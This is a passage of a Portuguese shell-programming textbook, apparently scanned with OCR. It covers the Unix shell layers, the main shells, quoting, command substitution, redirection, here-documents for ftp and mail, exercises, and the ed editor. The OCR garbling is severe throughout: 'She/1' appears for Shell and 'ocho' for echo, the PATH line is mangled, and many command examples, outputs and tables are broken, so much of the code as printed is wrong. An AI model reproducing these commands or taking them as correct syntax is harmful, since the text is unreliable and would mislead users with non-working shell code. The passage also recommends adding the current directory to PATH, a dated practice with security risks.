normalmente é mais um, e não o mais fundamental. Em 
que trilha do hard disk se encontra a área de boot da gran-
de maioria dos sistemas operacionais? Na zero, é claro, 
nada mais básico que um boot. 
A importância da compreensão deste capítulo é fun-
damental para o entendimento do resto (veja só, se não 
é zero é resto) da matéria. Só não o chamo de Zero Ab-
soluto por tratar-se de um pleonasmo, já que todo zero, 
inclusive matematicamente, é absoluto, pois não existe 
+O ou -0. 
Pelo conteúdo anterior, dá para você inferir o que 
vem adiante. Ainda está em tempo de desistir! O quê? 
Não desistiu? Então nota-se que você é uma pessoa 
persistente, uma vez tomada a decisão você vai até o 
fim ... Opa! Agora está parecendo astrologia! Vamos en-
tão ao que interessa antes de este livro descambar para 
o impalpável. 
Visão geral do sistema operacional UNIX 
Observe com atenção o diagrama de representação do 
Sistema Operacional UNIX na figura a seguir: 
84 
Material com direitos autorais 
She/1 
Programas e Comandos 
Kemel ou Núcleo 
o Básico do Básico 
85 
Os sistemas operacionais UNIX e LINUX foram concebidos em diversas 
camadas. Na camada mais interna está o hardware, composto dos drivers 
de dispositivos físicos (teclado, mouse, monitor, memória, unidades de dis-
co, disquetes, unidades de fita e unidades de CD-ROM). A camada que 
envolve o hardware é chamada de kernel (ou núcleo, ou cerne) e é res-
ponsável pelo gerenciamento e controle deste hardware. O kernel, por sua 
vez, está envolto por programas ou comandos que realizam tarefas bem 
específicas. A camada mais externa é chamada de Shell e é responsável 
pela interação entre o usuário e o sistema operacional e é esta que esmiu-
çaremos ao longo deste livro. 
Quem não é movido a gasolina, precisa de Shell? 
Se trabalhar com o Sistema Operacional UNIX, certamente a resposta é 
sim, já que no momento em que completa o seu "login", você já está em 
um Shell 4 
O quê? Já estou em um Shell? Como assim? 
Já, porque o Shell é a interface entre o UNIX e qualquer agente externo. 
O She/1 é simplesmente o programa que lê o comando que você teclou e 
converte-o em uma forma mais simplificada e legível para o Sistema Ope-
racional UNIX, diminuindo o tempo gasto pelo UNIX (ou kernel) na execu-
ção desse comando. 
4. O que foi dito é uma simplificação. Ao se ' lagar', o que você recebe é o programa que está defini-
do no último campo do seu registro em /etc/passwd. Pode ser um dos She//s definidos mais à frente 
(na seção Principais Shells) ou qualquer outro programa. Neste caso, ao finalizar a execução desse 
aplicativo, o usuário receberá imediatamente o ~logout". 
Matenal çorn d1re1tos at•tora1s 
86 Programação Shell Linux 
O She/1, por ser um interpretador de comandos de alto nível de sofistica-
ção, também pode ser utilizado como linguagem de programação. Usuários 
podem combinar sequências de comandos para criar programas chamados 
scripts (não confunda com arquivos de lote do MS-DOS, porque o interpre-
tador do Unix/Linux tem muito mais recursos e facilidades que este). 
A ideia de um interpretador de comandos independente do sistema ope-
racional foi uma importante inovação do Unix, adotada também por todos 
os sistemas operacionais modernos. 
Quando o usuário entra em um sistema Linux, um Shell é iniciado em 
seu terminal e um prompt de linha de comando indica ao usuário que o 
próximo comando pode ser executado. Note que ao longo deste livro, para 
efeito puramente didático, o prompt será representado por um cifrão !$l e 
as linhas que seriam digitadas por você estão em negrito. 
Existem vários arquivos de comandos que são executados quando você se 
"Ioga". Um deles é o ~ 1. ba sh _proíile (ou simplesmente -1 . p r ofile no UNIX). 
Este arquivo é um dos responsáveis pela customização do ambiente de traba-
lho de cada usuário e por isso fica na raiz do seu diretório home (que, como 
veremos no livro, pode ser representado genericamente por um til (- l ). 
Se você inserir ao final desse arquivo a linha: 
PATH=$P.".Tn: . 
Você estará dizendo ao She/1 para procurar arquivos também no seu 
diretório home e poderá executar um script chamado prg . s h simplesmente 
fazendo: 
$ p .rg . sh 
E é esta a forma de uso que você verá ao longo de todo este livro. Caso 
essa linha não exista no seu arquivo e você não queira inseri-la, para exe-
cutar o mesmo p r g . sh faça: 
$ . / prg.sh 
Imaginemos que exista um §.istema Qperacional residente em Qisco (que 
chamaremos, para efeito didático, de SOD) que não está, nem um pouco, 
preocupado com sua performance, já que ele foi escrito para trabalhar em 
ambientes monousuários. Neste SOD ocorrem coisas do tipo: 
Material com direitos autorais 
o Básico do Básico 
87 
Se desejar listar os nomes de todos os arquivos, você executa: 
d i r. • 
Se desejar copiar todos os arquivos do diretório diret para o diretório 
corrente (aquele em que você se situa neste momento), você faz: 
copy d i r et\* 
No SOD, em ambos os casos, quem interpretou os asteriscos <*) 
foram as instruções correspondentes, isso significa que tanto o coman-
do dir como o copy possuem, embutida em seus códigos, rotina para 
interpretação de metacaracteres ou curingas, onerando aquele Sistema 
Operacional durante a execução dessas instruções. O Sistema Ope-
racional UNIX, por ser extremamente otimizado, delega essa e outras 
funções ao She/1, que resolve-as deixando-as prontas para execução 
pelo kernel. 
Para provar isso, suponha que o seu diretório corrente seja lmeudir e o 
único arquivo residente no diretório em que você se encontra, com o prefixo 
cur, seja um subdiretório chamado curso. 
Exemplo: 
Se você fizer: 
$ c d cur* 
$ p wd 
/ meudi r / curso 
Esse teste demonstra que no UNIX, quem interpreta os metacaracteres 
é o Shell e não os comandos. Experimente fazer: 
$ e cbo cur• 
c urse 
ATEN 
O 
Nos exemplos a seguir, como em todos deste livro, as linhas que 
serão digitadas por você estão em negrito e o cifrão ($) no início é 
usado para indicar o prompt default. 
Material com direitos autorais 
88 Programação Shell Linux 
Por que Shell? 
Conforme já vimos, She/1 é um interpretador de comandos e é uma cama-
da entre o kemel e o usuário. O que veremos a seguir é que ele possui 
em seus built-ins instruções que o tornam uma poderosa linguagem de 
programação. Um programa em She/1, também chamado script, é uma 
ferramenta fácil-de-usar para construir aplicações "colando e aglutinando" 
chamadas de sistema, ferramentas, utilitários e binários compilados. Virtu-
almente todo o repertório de comandos Unix/Linux, utilitários e ferramen-
tas estão disponíveis para serem usados nativamente em um She/1 script. 
Se isso não fosse suficiente, comandos internos do She/1 (built-ins), como 
instruções de condicionais e de loop, dão um poder adicional e flexibilida-
de aos scripts. 
O conhecimento de Shefl scrípt é essencial para quem deseja tornar-se 
um razoável administrador, mesmo que não pense em desenvolver scripts. 
Como em tempo de boot uma máquina Unix/Linux executa os diversos 
scripts contidos em 1 etc/ rc . d para configurar o sistema e inicializar os 
serviços, um entendimento detalhado destes é importante para a análise 
do comportamento do sistema, e sua possível modificação. 
Se é possível desenvolver em She/1 praticamente qualquer aplicação 
com interface a caractere, por que invocar um outro interpretador para tra-
balhar sob o Shefl? É ... é verdade, quando na primeira linha de um script 
em, digamos, Perf você escreve: # •/bin/perl, o que você está fazendo é 
avisar ao Shel/ que este script será interpretado pelo Per/, e não pelo Shelf, 
onerando dessa forma a performance do computador, pois você terá, no 
mínimo, estes dois interpretadores na partição. 
Pela facilidade no aprendizado, pela alta produtividade e pelo prazer 
propiciado em sua programação, o She/1 é uma excelente ferramenta, in-
clusive para prototipar aplicações complexas. 
Tarefas do Shell 
A seguir estão descritas, na ordem em que são executadas, as principais 
tarefas cumpridas pelo Shelf. 
Material com direitos autorais 
o Básico do Básico 
89 
Exame da linha de comandos recebida 
Nesse exame, o She/1 identifica em primeira mão os caracteres que por si 
só têm significado especial para a interpretação da linha, em seguida iden-
tifica se a linha passada é um comando (ou programa) ou uma atribuição. 
Comando 
O She/1 analisa a linha e identifica, separados por espaço(s) em branco: 
o nome do programa (qualquer comando é encarado como um programa) 
e pesquisa a sua existência na ordem de sequência do caminho padrão 
(path); identifica também suas opções/paràmetros, seus redirecionamen-
tos (cuja utilização veremos no capítulo 1) e suas variáveis. 
Quando o programa identificado existe, o She/1 analisa as permissões 
do(s) arquivo(s) envolvido(s), dando uma mensagem de erro, caso o ope-
rador não esteja credenciado a executar essa tarefa. 
Atribuição 
A atribuição é identificada quando o Shell encontra um sinal de igualdade 
<=l separando dois campos sem espaços em branco nos dois lados do 
sinal de igualdade <=>. 
Exemplos: 
$ var =a 
Procurou o programa var por causa do branco 
ks h: var : 
not f ound 
$ var=a b 
ksh: b : 
not f ound 
EspllÇO entre a e b. Achou que b era comando 
$ var= 'a 
b * 
Sem erro. O O inibe a interpretação no seu interior 
$ echo $var 
a b 
Para o She/1 baste um branco como separador 
Agora, me explique, o que aconteceria se fizéssemos: 
$ var= a 
ou: 
$ var=' a b' 
Material com direitos autorais 
90 Programação Shell Linux 
Resolução de redirecionamentos 
Uma vez identificado que existe(m) redirecionamento(s) da entrada (stdin), 
da saída (stdout) ou dos erros (stderr), o She/1 prepara o ambiente para que 
esse redirecionamento ocorra, para livrar o kemel dessa tarefa. 
ATENÇÃO 
Tome muito cuidado com essa facilidade do Shell, pois se você 
deseja enviar a saída de uma instrução para um arquivo, este 
arquivo será criado vazio, antes desse comando ser executado, 
o que pode acarretar sérios problemas. Por exemplo, se você 
quiser fazer um cat de um arquivo dando a saída nele mesmo, o 
comando cal acusará erro, porém o Shell, antes da execução da 
instrução, já havia "esvaziado" o arquivo. 
Substituição de variáveis 
Nesse ponto, o She/1 verifica se as eventuais variáveis (parâmetros pre-
cedidos por $ e em cujo nome tem somente letras, números e caracteres 
sublinha (_ l ), encontradas no escopo do comando, estão definidas e as 
substitui por seus valores nesse instante. 
Substituição de metacaracteres 
Se algum metacaractere ( *, ? ou r J) for encontrado na linha de comando, 
nesse ponto ele será substituído por seus possíveis valores. 
Passa linha de comando para o kernel 
Completadas as tarefas anteriores, o She/1 monta a linha de comandos, 
já com todas as substituições feitas, chama o kernel para executá-la em 
um novo She/1 (Shefl filho), ganhando um número de processo (PIO ou 
Process ldentification) e permanece inativo, tirando uma soneca, durante 
a execução do programa. Uma vez encerrado esse processo {juntamente 
com o Shefl filho}, recebe novamente o controle e, exibindo um prompt, 
mostra que está pronto para executar outros comandos. 
Material com direitos autorais 
o Básico do Básico 
91 
Principais Shells 
O She/1 é um programa interpretador de instruções, que foi escrito em di-
ferentes versões. A seguir, descreveremos as mais frequentemente encon-
tradas e utilizadas, não sendo porém as únicas. 
Bourne Shell 
Esse é o She/1 padrão do UNIX, cuja versão padrão foi escrita por Stephen 
Bourne da Bel/ Labs. Esse She/1, também chamado de ''Standard Shelf' (ou 
"Shell Padrão" em português) é, indiscutivelmente, o Shell mais utilizado, 
até porque todos os sabores de UNIX têm o Bourne She/1 adaptado aos 
seus ambientes. 
Sua representação para o UNIX é sh . 
Bourne-Again Shell 
Esse é o She/1 padrão do LINUX. Seu número de usuários vem crescendo 
vertiginosamente devido à grande propagação de uso de seu Sistema Ope-
racional hospedeiro. É quase 100% compatível com o Bourne She/1, porém 
traz consigo não só as implementações feitas para o Korn She/1, como tam-
bém inúmeros comandos característicos do C She/1. 
Sua representação para o LINUX é bash . 
Korn Shell 
Esse Shel/, que foi desenvolvido por David Korn da Bel/ Labs da AT&T, é 
um upgrade do Bourne She/1, isto é, todos os comandos do Bourne She/1 
são reconhecidos pelo Korn Shell. Esta compatibilidade está influenciando 
positivamente os usuários e programadores de She/1 (em ambientes UNIX 
e não em LINUX) a usarem cada vez mais esse interpretador, devido ao 
maior leque de opções e instruções por ele provido. 
Em virtude do grande crescimento observado no uso desse interpre-
tador, nesta publicação, em diversas situações, mostraremos comandos 
específicos do Korn She/1, sempre realçando essa especificidade. 
Sua representação para o UNIX é ksh . 
Material com direitos autorais 
92 Programação Shell Linux 
C Shell 
O C She/1 foi desenvolvido por Bill Joy da Berkeley University. É o She/1 
mais utilizado nos ambientes Berkeley (BSD) e XENIX. A estrutura de sua 
linguagem é bastante parecida com a linguagem C. 
O C She/1, identicamente ao ksh , contempla diversos aspectos não im-
plementados no sh . Se por um lado isso é bom, por dar mais recursos, por 
outro lado é um fator para a não proliferação maciça desse ambiente, pois 
programas desenvolvidos para esse interpretador só podem ser executa-
dos nele, perdendo desta forma a portabilidade que é um dos pontos fortes 
e característicos do Sistema Operacional UNIX. 
Sua representação para o UNIX é csh . 
O objetivo desta publicação é ensinar a programar nos três primeiros 
(sh, 
bash e ksh), sendo portanto os programas e exercícios propostos 
feitos para esses ambientes. 
O sh, o bash e o csh são nativos do LINUX (quando você instala 
o LINUX no seu computador, esses três interpretadores são também 
instalados), ao passo que o sh, o k:sh e o csh vêm com os demais Sis-
temas Operacionais UNIX, porém existem fontes de todos disponíveis 
na Internet e, caso você queira, por exemplo, instalar o J.:sh em seu 
LINUX, ou o bash em um servidor UNIX, basta compilá-lo após fazer o 
download. 
O Bourne She/1 csh >, apesar de não ter todos os recursos do bash e 
do ksh, é o interpretador para o qual tento orientar todos os scripts que 
desenvolvo, já que por estar presente em todos os sabores LINUX! 
UNIX, são portáveis para os equipamentos sob esses Sistemas Ope-
. 
. 
rac1ona1s. 
É importante notar, no entanto, que infelizmente algumas distribuições 
LINUX insistem em, em vez de fornecer essa ferramenta, simplesmente 
criam um ponteiro (link) para o bash . Assim, quando você pensa estar sob 
o sh, efetivamente você estará sob o bash . 
1\latcna com d r bS utor <t 
O Básico do Básico 
93 
Sem comentários 
O caractere # (jogo da velha, tralha, sustenido, ... ) indica ao interpretador 
que a partir daquele ponto tudo o que vem a seguir na mesma linha é um 
comentário do autor do script, assim em: 
la - l arq• ~ Lista todos os arquivos comocados por arq 
O pedaço a partir do 11 
(Lista todos os arquivos comecados por a rq) é 
considerado pelo interpretador como um comentário e seu uso deve ser 
encorajado como uma boa prática de codificação de programas, que visa 
facilitar posteriores manutenções. 
No entanto, caso a primeira linha de um script comece por 11! , o She/1 
entenderá que o que vem a seguir é o caminho (path) para o intepretador 
que será usado por este script. Assim sendo, é normal encontrarmos scripts 
começados por: 
!1 !/bin/bash 
Ol,l 
il ! /bin/5h 
ou 
i !/bin/nwk 
ou 
i !/bin/sed 
entre outros. 
Não sei o porquê deste nome, mas vale a informação, é habitual nos refe-
rimos a estas linhas que indicam o interpretador que o script usará como 
shebang fine. Algumas vezes já vi chamarem também de hasbang fine. 
- ~ -
1\latcna com d r bS utor <t 
jCapítulo 1 
. . . 
~ Recordar é Viver 
~ Usando aspas, apóstrofos e barra 
invertida 
Para usar literalmente um caractere especial sem que 
o She/1 interprete seu significado, coloque o caractere 
entre aspas ou entre apóstrofos ou coloque uma barra 
invertida antes dele. Seus usos característicos são me-
lhores definidos ass.im: 
-
Aspas - Quando se coloca um caractere especial 
entre aspas, o She/1 ignora o seu significado, exceto 
no caso de esse caractere ser um cifrão (s), uma 
crase (. ), ou uma barra invertida(\ ). 
-
Apóstrofos- Os apóstrofos são mais restritivos. To-
dos os caracteres entre apóstrofos são ignorados. 
-
Barra Invertida- O She/1 ignora um e somente um 
caractere que segue a barra invertida. Quando co-
locada ao final da linha, o Shell interpreta a barra 
invertida como um aviso de continuação da linha, 
devolvendo um prompt secundário (1>s2) na linha se-
guinte da tela. Mas, note bem, isso ocorre porque o 
<ENTER> não foi visto pelo She/1 por estar seguindo 
a contrabarra. 
94 
1\latcna com d r bS utor<t 
Exemplos: 
$ echo • 
Arql hrq2 
S echo \\ 
\ 
S echo \ 
> 
<~c> 
S echo "\" 
'> <"c> 
Recordar é Viver 
95 
Se você for criativo, descobrirá muitos usos para a barra in-
vertida.Vejamos um unalias imediato: suponha que você te-
nha feito: alias rm• ' rm - i', caso você execute: \rm <arq>, 
o arquivo <arq> será removido sem solicitar a confirmação, 
porque quando você colocou a contrabarra < \ 1 , você escon-
deu da interpretação do Shell o r do comando rm, então ele 
não executou o alias . 
A t• barra invertida inibiu a atuação da 2• 
O Shell não viu o <ENTER> e 
devolveu um prompt secundário(>) 
As aspas não inibem a interpretação da I 
$ ocho Estou escrevendo uma linha compacta. 
Estou esc.rev endo uma linh a. compacta 
$ echo Assim não 
se 
escreve 
uma 
linha 
espacejada. 
Assim na o ,.., ""creve u lll4 linh <~ e3pacej a da . 
Os brancos são signilicaUvos para o She/1 
$ echo 
"Estou 
escrevendo 
uma 
linha 
espacejada.• 
E:stou 
escrevendo 
uma 
l inha 
e.5pacejada. 
Crase e parênteses resolvendo crise entre parentes 
As crases são usadas para avisarmos ao She/1 que o que está entre elas 
é um comando e para darmos prioridade em sua execução. Às vezes, é 
necessário priorizarmos um comando para que o seu resultado seja utiliza-
do por outro. 
Exemplo: 
Supondo que o nome do computador em que estamos trabalhando seja 
comput1 , e fazendo: 
$ oeho 
110 nomo dos to computador ó 
unamo -n .. " 
O nome deste computador é computl 
Caso o comando uname -n não estivesse entre crases o resultado teria 
sido: 
O nome deste computador ê un arne - n 
1\latcna com d r bS utor<t 
96 Programação Shell Linux 
Essa técnica é chamada de substituição de comando (command 
substitution) porque com seu uso você literalmente "pluga" a saída de um 
comando como argumento de outro. 
Repare a diferença entre os comandos a seguir: 
$ dir-pwd 
$ echo $dir 
pwd 
$ dix= ' pwd· 
$ echo $dir 
/hot:~e/jneves 
Nesse caso, estávamos executando duas ações: uma atribuição (com o 
sinal de igual) e uma instrução (pNdl e para que o pwd fosse executado 
antes da atribuição, foi necessário colocá-lo entre crases. 
Talvez, em virtude da matemática, temos tendência a usar os parên-
teses para priorizar essa execução de comandos. Está errado! No She/1, 
quando se usa um comando ou um agrupamento de comandos (que se 
consegue separando-os por ponto e vírgula), o que se está fazendo é 
chamar um She// secundário (ou She/1 filho) para executar esse(s) 
comando(s). 
Exemplo: 
Suponhamos que você está situado em dirmeu na seguinte estrutura de 
diretórios: 
dirnosso 
dirmeu 
dirdele 
Arqmeul 
Arqdelel 
Arqmeu2 
Arqdelc2 
1\latcna com d r bS utor <t 
Recordar é Viver 
97 
Preste atenção nos comandos seg1uintes: 
S ( cd . ./dirdele; ls ) 
arqde!el 
O ponto e v/rgula separa 2 comandos na linha 
arqdele2 
$ pwd 
d i rmeu 
Repare que nós fomos ao diretório dirdele e listamos os arquivos 
lá contidos, porém ao final do comando estávamos novamente no di-
retório dirmeu. Se, após essa seqUiência de comandos, você sentir-se 
o Mandrake (o mágico ... ), desista. No duro, seu She/1 nunca saiu do 
diretório dirmeu, o que aconteceu foi que os parênteses invocaram um 
novo I que, esse sim, foi para o segundo diretório, listou seu conteúdo 
e morreu ... 
O que vimos é muito conveniente para os preguiçosos (e no meu en-
tender todo bom programador tem de ser preguiçoso), pois para fazer da 
forma convencional deveríamos: 
$ cd .. /dirdele 
S ls 
$ cd -
Até aqui tudo bem, né? Bom, já que está tudo entendido, vou lançar 
um outro conceito para bagunçar tudo e semear a discórdia. É o seguinte: 
existe uma outra construção que vem sendo usada no lugar das crases. 
Como nem todos os sabores de Shell a implementaram, vou usá-la pou-
cas vezes no decorrer deste livro (o suficiente para você não se esque-
cer que ela existe); porém, como vem ganhando terreno, vou citá-la. Para 
dar precedência de execução a um comando sobre os outros, coloque 
este comando dentro de uma construção do tipo $ (comando ) , tal como no 
exemplo a seguir: 
$ echo "0 nome deste computador é $ (uname -n) " 
O no~ deste computador 6 computl 
Conforme você viu, o uso dessa construção é exatamente o mesmo das 
crases, para demonstrar isso usei o mesmo exemplo anterior. 
1\latcna com d r bS utor<t 
98 Programação Shell Linux 
Direcionando os caracteres de redirecionamento 
A maioria dos comandos tem uma entrada, uma saída e pode gerar erros. 
Essa entrada é chamada Entrada Padrão ou stdin e seu default é o teclado 
do terminal. Analogamente, a saída do comando é chamada Safda Padrão 
ou stdout e seu defau!t é a tela do terminal. Para a tela também são en-
viadas por default as mensagens de erro oriundas do comando que neste 
caso é a chamada Saída de Erro Padrão ou stderr. 
Para que a execução de comandos não obedeça aos seus respectivos 
defaults, podemos usar caracteres de redirecionamento com funções pre-
definidas conforme as tabelas: 
Redirecionamento de Saída 
Redireciona a saída de um comando para um arquivo especifica-
> do, inicializando-o caso não exista ou destruindo seu conteúdo 
>;> 
2> 
< 
<< 
anterior. 
Redireciona a saída de um comando para um arquivo especifica-
do, anexando-o ao seu fim. Caso esse arquivo não exista, será 
criado. 
Redireciona os erros gerados por um comando para o arquivo 
especificado. Mesmo que não ocorra erro na execução do coman-
do, o arquivo será criado. 
Redirecionamento de Entrada 
Avisa ao She/1 que a entrada padrão não será o teclado, mas sim 
o arquivo especificado. 
Também chamado de here documenL Serve para indicar ao She/1 
que o escopo de um comando começa na linha seguinte e termi-
na quando encontra uma linha cujo conteúdo seja unicamente o 
label que segue o sinal «. 
M terl 
ou 
I 
te e 
Exemplo: 
Recordar é Viver 
99 
Redirecionamentos Especiais 
Este é o famoso pipe, e serve para direcionar a saída de um co-
mando para a entrada de outro. É utilíssimo; não tenha parcimônia 
em usá-lo, pois normalmente otimiza a execução do comando. 
Captura a salda de um comando com pipe, copiando o que está 
entrando no tee para a salda padrão e outro comando ou arquivo. 
$ ftp - ivn remocomp << FimFTP >> /tmp/$$ 2>> /tmp/$$ 
> 
user fulano segredo 
Os simns >são prompts sewndários do UNIX. 
> 
binary 
Enquanto não surgir o /abel FimFTP o> será o 
> 
get arqnada 
prompt (PS2). para indícar que o comando não 
>FimFTP 
Terminou o FTP 
$ 
No exemplo anterior fazemos um FTP (File Transfer Protocol- que ser-
ve, basicamente, para transmitir ou receber arquivos entre computadores 
remotos) para remocomp. Vamos analisar estas linhas de código: 
Linha 1 - O trecho « 
E'imE'TP avisa ao She/1 que, até que o label E'imE''l'P 
seja encontrado na coluna 1 de alguma linha, todas as linhas intermediárias 
pertencem ao comando ttp e não deve ser interpretado pelo She/1, a não ser 
que exista um cifrão (s) desprotegido (que não esteja entre apóstrofos, ou sem 
uma barra invertida imediatamente antes) ou um comando entre crases (. ). 
O trecho » 
/trnp/ss significa que as mensagens do f tp deverão ser 
anexadas ao arquivo /tmp/<Num. do Processo>' e 2» /tmp/Ss o mesmo 
deverá ser feito com as mensagens de erro provenientes do comando. 
Linhas 2 a 4- Estas 3 linhas são o escopo do comando f t p. Nelas infor-
mamos o LoginName e a Password do usuário, em seguida avisamos que 
a transmissão será binária (sem interpretação do conteúdo) e ordenamos 
que nos seja transmitido o arquivo arqnada. 
Linha 5 - Finalmente o Shell encontrou o término do programa. A partir 
dai, novamente começará a interpretação. 
5. A variável S$ representa o PIO (Process ldentification). 
M terl 
ou 
100 Programação SheU Linux 
ATEN Ao 
A variável H deve ser usada para compor nomes de arquivos tem-
porários gerados por scripts de uso público (nunca esqueça que o 
Sistema Operacional UNIX é multiusuário), evitando conflitos de 
permissões de diferentes usuários sobre o referido arquivo. 
$ mail fulano < blablabl a 
No caso anterior, estou mandando um e-mail para o usuário f ulano e o 
conteúdo deste e-mail foi previamente editado no arquivo blablabla que 
está sendo redirecionado como entrada do comando mail . 
Exemplo: 
$ mail fulano << FirnMail 
O mail começa logo após e tennina em FimMaíl. 
Sr. Fu.lano, 
Brasil , ·date · 
Observe o comando date entre crases. 
Atualmente o conteúdo do meu diretorio eh : 
· l s -1 · 
O/s-I está entre crases, logo serâ resolvido. 
Atenciosamen te , EU 
FitnMail 
Termínou o texto do mail 
No exemplo anterior, foi enviado um e-mail para o usuário fulano, cuío 
conteúdo terminaria quando o She/1 encontrasse apenas o label riml1al.l 
em uma linha. Mas o She/1 identificou os comandos clate e 1s -1 entre 
crases e resolveu-os. Dessa forma, na mensagem enviada ao s r Fulano 
continha a data de envio da correspondência e todos os arquivos que com-
punham o diretório corrente naquele momento. 
ATEN ÃO 
Uma fonte de erros muito comum em scripts é devido a espaços 
em branco antes ou após um label. Conforme frisei antes, pres-
te atenção para que uma determinada linha possua apenas o 
label. Esse tipo de erro é de difícil detecção, porém para desco-
brir espaços e caracteres especiais indeseíados use a instrução 
cat: com as opções -vet. 
Mais um exemplo: 
$ rm talve: 2> /dev/ null 
1\latcna com d r bS utor <t 
Recordar é Viver 
101 
Para não poluir a tela do meu script e por não ter certeza se o ar-
quivo talvez existe, eu uso esta construção porque, caso o arquivo não 
exista, a mensagem de erro do rm tal vez : no sue h file o r dírectory 
não será exibida na tela, desta forma poluindo-a, mas sim enviada 
para /dev/null, ou seja, para o buraco negro, onde tudo se perde e 
nada volta. 
$ ocho "Atualmont o oxistom · who I wc -1 · usuari oo conectados" 
Atual men te ex~stem 
1 usuar ios conectados 
who 
.... JC -1 
Lista os usuários conectados; 
Conta linhas; 
Pega a lista gerada pelo who e a entrega ao wc -1 para contá-tas. 
O comando anterior poderia ficar melhor se tirássemos as aspas: 
$ echo Atualmente exi stem ' who I wc -1 · usuari os conectados 
1\cualmence existem 4 usuarios coneccados 
Exercícios 
Como diz o enunciado deste capítulo, "Recordar é Viver", e como o intui-
to deste livro é ser eminentemente prático na medida do possível, alguns 
dos exercícios a seguir, por não terem sido explicados até este ponto, não 
devem ser encarados como um desafio, mas sim como uma forma de re-
aprender o Bash básico, porém fazê-los é indispensável, pois ao longo do 
livro usaremos muito os conceitos de metacaracteres. Vejamos o conteúdo 
do nosso diretório corrente: 
? ls 
2ehbom 
bdb 
listdir 
param3 
quequeJ.sso 
teles 
DE:AOJOE 
bronze 
listdirl 
par;un4 
.rem 
test:char 
DuLoren 
confusao 
lt 
param5 
t:afechado 
testsex 
Param 
e rreerne 
medieval 
param6 
talogado 
t:pU1:cup 
a a 
hora 
paraml 
pedi 
tava:io 
tr 
add 
kadeo 
pacam2 
pp 
telefones 
1. Como se comportariam os seguintes comandos? 
l s * 
ls [ !lpt) *o 
ls [Pp] * 
l s [apt] (ao] (dls ] • 
ls (c-m.s-:) *o 
la *[ 14-6) 
ls param? 
l a *f"-eiou] * 
ls ?aram? 
la te( !a)* 
1\latcna com d r bS utor <t 
102 Programação SheU Linux 
2. O que aconteceria na execução destas sequências de comandos? 
ls I wc - 1 
ls > /tmp/$$ 2> /tmp/x$$ 
l s Nunc aVi >> /tmp/$$ 2>> /tmp/ x $$ 
e cbo Nome do Sis tema: unrune 
ocbo Nome do Si stema: "unamo ' 
mail procara < mala 
(cd ; p wd) 
c at quoqueisso I toe qqisso 
mail p r ocara << 1 
cat /otc/passwd I sort I l p 
3. Qual comando deve ser empregado para: 
Mandar mail para o LoginName xato, estando o texto da correspon-
dência no arquivo blabla.mail; 
Mandar mail para o LoginName xato, estando o texto redigido ime-
diatamente após o comando; 
Mandar mau para o LoginName xato, contendo os nomes dos arqui-
vos do diretório corrente (aquele que você estava quando o mau foi 
enviado) e a data e hora atualizadas; 
Executar o programa prog , mandando a sua saída simultaneamente 
para a tela e para o arquivo prog . log : 
Executar o programa prog mandando a saída simultaneamente para 
a téla, para o arquivo pro9 .1o9 é para a irnpréssora; 
Listar todos ao arquivos começados por a, b, c, d, e, h, i, j, k, x e que 
não terminam com esses mesmos caracteres; 
Escrever na tela do terminal: 
As seguint es pessoas est~o logadas : <relação gerada pelo comando who> 
1\latcna com d r bS utor <t 
jCapítulo 2 
. . 
• . 
~ Comandos que não são 
~ do Planeta 
. 
. 
i Neste capítulo estudaremos comandos e/ou opções de 
comandos que não são usados com muita frequência 
nas tarefas do dia .a dia da operação do UNIX, porém 
são utilíssimos na elaboração e desenvolvimento de 
scripts. 
Para que possamos entender melhor o conteúdo des-
te capítulo, ao final do livro foi inserido um apêndice que 
trata das expressões regulares ou regexp, ou ainda, abra-
síleirando e simplificando, ER. É altamente recomendável 
sua leitura, pois além do que será visto neste capítulo, 
diversas instruções que você verá mais à frente usam e 
abusam das ERs. 
O ed é d+ 
Vale a pena, como introdução a este capítulo, dar uma re-
lembrada no ect, já que algumas das instruções que vere-
mos a seguir usam abundantemente (ops!) os conceitos, 
parâmetros e comandos desse editor. 
Já sei que você está se perguntando por que vamos 
estudar diretivas de um editor, se este é um livro de pro-
gramação. A resposta é simples: quando o seu Sistema 
Operacional lhe deixou na mão, tendo como consolo so-
mente um disquete de boot de emergência, nesse mo-
103 
1\latcna com d r bS utor <t 
104 Programação SheU Linux 
mento está só, amigo! Seu único companheiro para lhe ajudar a fazer os 
acertos necessários para que sua máquina volte a funcionar é o ed . Como 
as ERs usadas por esse editor são as mesmas usadas pelo vi , por co-
mandos como o secl e o grep (entre outros) e até por linguagens como o 
per/ e o phyton (entre outras), por que não sentar na varanda da saudade 
e relembrá-lo? 
Para tal, temos um arquivo chamado quequeisso com o seguinte formato: 
$ ca.t quequeisso 
ATE:NCAO, O TEXTO ABAIXO NAO EH TREINAHENTO, 
E:H 
U~IA LAVAGEH CERE:BR.'\1.! ! ! 
O Shell alem de analisar cada dado entrado a partir do proJ!l't do UNIX, 
4nterfaceando com os usuar4os, tem tambem as segu1ntes atribuicoes : 
Int erpretador de comandos; 
Controle do ambiente UNIX; 
Redirecionamento de entrada e saida.; 
Sub~t i tu icao de nomes de arquivos ; 
Concatenacao de pipe; 
&xecucao de programas; 
?oderosa l inguagem de programacao . 
Indicador de pesquisa: 1 
A barra serve para indicar uma pesquisa no arquivo, assim: 
/v asco 
Procurará a sequência de caracteres vasco em qualquer lugar da linha. 
Exemplos: 
$ ed quequeisso 
416 
l , $p 
ATE:NCAO, O TEXTO ABAIXO NAO EH TREINAMENTO, 
EH U!•IA LAVAGEH CEREBRAL ! ! ! 
416 caractere$ no 8/'QUÍVO 
Listar(p) da 1'(1) à última{$) linha 
o Shell alem de analisar cada dado entrado a partir do prompt do VNlX, 
1nterfaceando com os usuarios~ cem ~ambem as seguintes atribuicoes : 
Int erpretador de comandos; 
Controle do ambiente UNIX; 
R~dirêcionamênto dê ~ntrada ~ salda; 
Substi tui cao de nomes de arquivos; 
Col'\c.aten.ac.ao de pipe; 
1\latcna com d r bS utor<t 
Comandos que não são do Planeta 
105 
Execucao de programas; 
Poderosa linquagem de programacao. 
/ EH 
Pesquisa a oco/Téncia da cadeia EH 
ATENCAO, O 'l'EXTO ABAIXO NAO SH 'l'REINAJ>IENTO, 
I 
EU Ul1A LAVAGEM CEREBJV'\L! ! ! 
Início da linha: A 
Repele a mesma pesquisa 
Quando nossa intenção for pesquisar uma cadeia de caracteres no início 
da linha e somente no inicio, usamos o circunflexo <" 1. 
Assim a expressão regular: 
" f l amengo 
Procurará a existência dos caracteres flamengo somente se eles ocorrerem 
no início da linha. 
Exemplos: 
S a d quoquois so 
416 
l,$p 
ATEJICAO, O TEXTO ABAIXO NAO E!! TREINAI-!ENTO, 
EH IJ11A LAVAGEl1 CEREBRAL! ! ! 
